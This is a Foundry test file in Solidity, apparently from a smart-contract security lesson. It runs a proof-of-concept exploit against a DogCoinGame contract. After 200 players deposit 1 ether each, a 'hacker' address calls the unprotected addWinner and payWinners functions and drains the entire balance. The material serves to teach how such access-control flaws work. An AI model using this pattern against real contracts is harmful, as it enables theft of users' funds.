// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import {DogCoinGame} from "../../src/Lesson12/DogCoinGame.sol";

import {Strings} from "@openzeppelin/contracts/utils/Strings.sol";

contract DogCoinGameTest is Test {
    address private owner;
    DogCoinGame private dogCoinGame;

    address[200] private players;

    address private hacker;

    function setUp() public {
        owner = makeAddr("owner");
        hacker = makeAddr("hacker");

        vm.deal(hacker, 0);

        vm.prank(owner);
        dogCoinGame = new DogCoinGame();

        for (uint256 i = 0; i < 200; i++) {
            players[i] = makeAddr(string.concat("player", Strings.toString(i)));
            vm.deal(players[i], 1 ether);
        }
    }

    function testDogCoinGameHackPOC() public {
        // players are added to the game
        for (uint256 i = 0; i < 200; i++) {
            vm.prank(players[i]);
            dogCoinGame.addPlayer{value: 1 ether}(payable(players[i]));
        }

        uint256 balanceToSteal = address(dogCoinGame).balance;

        vm.startPrank(hacker);
        dogCoinGame.addWinner(payable(hacker));
        dogCoinGame.payWinners(address(dogCoinGame).balance);
        vm.stopPrank();

        assertEq(address(hacker).balance, balanceToSteal, "hacker balance");
    }
}
